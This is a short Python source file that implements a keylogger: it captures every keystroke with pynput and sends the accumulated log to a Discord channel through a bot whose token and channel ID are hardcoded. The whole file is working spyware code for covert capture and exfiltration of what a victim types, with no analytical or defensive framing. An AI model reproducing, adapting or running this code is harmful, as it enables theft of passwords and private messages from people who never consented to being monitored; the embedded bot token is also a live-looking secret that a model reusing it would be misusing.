import pynput.keyboard
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.typing = True
intents.presences = False
intents.messages = True

token = "MTE0NDY2OTc3MTY2MTU4MjQ0Ng.GuBejd.6nGnLbkYQLahCwGWwCHdR6Q3bVmZGcXf7o4qMY"
channelID = 1144662908358365369

bot = commands.Bot(command_prefix="!", intents=intents)

log = ""
keyloggerListener = None


@bot.event
async def on_ready():
    print(f"Bot logged in as {bot.user.name}")
    start_keylogger()


def callbackFunction(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)


@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.id == channelID:
        if log:
            await message.channel.send(log)


def start_keylogger():
    global keyloggerListener
    keyloggerListener = pynput.keyboard.Listener(on_press=callbackFunction)
    keyloggerListener.start()


def stop_keylogger():
    global keyloggerListener
    if keyloggerListener:
        keyloggerListener.stop()
        keyloggerListener.join()


@bot.event
async def on_disconnect():
    stop_keylogger()


bot.run(token)
